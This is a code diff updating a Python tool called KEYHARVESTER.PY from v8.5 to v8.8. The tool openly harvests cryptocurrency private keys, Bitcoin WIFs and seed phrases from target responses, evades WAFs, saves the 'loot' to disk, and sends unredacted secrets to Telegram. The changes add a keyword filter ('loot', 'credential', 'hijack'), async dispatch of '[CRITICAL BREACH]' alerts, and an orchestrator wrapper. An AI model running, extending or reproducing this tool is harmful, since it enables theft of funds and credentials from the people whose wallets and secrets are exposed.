@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-KEYHARVESTER.PY v8.5 — Active Cryptographic Secret & Artifact Discovery Engine (WAF Hardened)
+KEYHARVESTER.PY v8.8 — Active Cryptographic Secret & Artifact Discovery Engine (WAF Hardened)
 Features:
 - Live unredacted extraction of EVM private keys, Bitcoin WIFs, and BIP39 seed phrases with behavioral jitter & WAF evasion
 - Direct on-screen terminal streaming of harvested raw secrets and API tokens
 - Automated immutable disk persistence (loot_output/) via centralized framework logger
 - Anti-noise validation filters for high-precision cryptographic detection
-- Real-time asynchronous Telegram notification dispatch for unredacted cryptographic loot
+- Real-time asynchronous Telegram notification dispatch for unredacted cryptographic loot (Zero Noise Filter)
 """
 import re
 import sys
@@ -30,6 +30,12 @@ COLORS = {
     "BOLD": "\033[1m",
 }
 
+# Keywords required to pass the zero-noise filter
+HIGH_VALUE_KEYWORDS = [
+    "critical", "bypass", "success", "loot", "token", "session", 
+    "admin", "credential", "compromised", "race", "pivot", "jwt", "dump", "hijack", "privilege", "key", "seed"
+]
+
 # Common non-seed words appearing in HTML logs or error text to prevent false positives
 NOISE_WORDS = {
     "target", "https", "http", "online", "results", "url", "favicon", "ico", 
@@ -42,14 +48,29 @@ def terminal(message):
     sys.stdout.write(message + "\n")
     sys.stdout.flush()
 
-def broadcast_tg_alert_sync(loot_type, details):
-    """Helper to non-blockingly fire Telegram alerts from synchronous keyharvester functions."""
+async def broadcast_tg_alert_async(loot_type, details):
     try:
+        check_str = f"{loot_type} {str(details)}".lower()
+        if any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
+            await send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details)
+    except Exception:
+        pass
+
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from synchronous keyharvester functions with zero-noise filtering."""
+    try:
+        check_str = f"{loot_type} {str(details)}".lower()
+        if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
+            return
+
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        if loop.is_running():
+            loop.create_task(broadcast_tg_alert_async(loot_type, details))
+        else:
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
         except Exception:
             pass
 
@@ -81,7 +102,6 @@ def is_valid_evm_key(key_str):
     except ValueError:
         return False
     
-    # Secp256k1 curve order check
     curve_order = int(
         "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE"
         "BAAEDCE6AF48A03BBFD25E8CD0364141",
@@ -116,10 +136,8 @@ def _record_finding(findings, seen, secret, secret_type, offset, target_context=
         "raw_secret": secret
     }
 
-    # BROADCAST UNREDACTED CRYPTOGRAPHIC LOOT STRAIGHT TO TELEGRAM
     broadcast_tg_alert_sync(f"Cryptographic Secret Harvested [{secret_type}]", loot_payload)
 
-    # STREAM TELEMETRY & PERSIST CRYPTOGRAPHIC LOOT TO DISK IMMEDIATELY
     stream_proof("CRYPTO_SECRET_HARVESTED", f"offset_{offset}", {"secret_type": secret_type}, secret[:12] + "...", {"exposed": True})
     save_session_loot(
         target=target_context,
@@ -131,11 +149,11 @@ def _record_finding(findings, seen, secret, secret_type, offset, target_context=
         extra_loot=loot_payload
     )
 
-def harvest_private_keys(target_source_data="", target_context="https://cryptobytes.online"):
+def harvest_private_keys(target_source_data="", target_context="https://example.com"):
     apply_behavioral_jitter()
     terminal(
         f"\n{COLORS['MAGENTA']}[***] "
-        f"ACTIVE CRYPTOGRAPHIC SECRET DISCOVERY & HARVESTING (V8.5 HARDENED) "
+        f"ACTIVE CRYPTOGRAPHIC SECRET DISCOVERY & HARVESTING (V8.8 HARDENED) "
         f"[***]{COLORS['RESET']}"
     )
     findings = []
@@ -216,6 +234,11 @@ def harvest_private_keys(target_source_data="", target_context="https://cryptoby
     terminal(f"    Secured to Disk         : loot_output/")
     return findings
 
+# --- PROPER ASYNC COMPATIBILITY WRAPPER --- 
+async def harvest_keys(target_source_data="", target_context="https://example.com"):
+    """Proper asynchronous wrapper for CognitiveOperator and main orchestrator integration."""
+    return harvest_private_keys(target_source_data, target_context)
+
 if __name__ == "__main__":
     if len(sys.argv) > 1:
         target_file = sys.argv[1]
@@ -226,9 +249,4 @@ if __name__ == "__main__":
             print(f"[!] File not found: {target_file}")
     else:
         print("Usage: python3 keyharvester.py <target_response_file>")
-
-
-# --- AUTOMATED ALIAS PATCH --- 
-async def harvest_keys(*args, **kwargs):
-    return await terminal(*args, **kwargs)
 
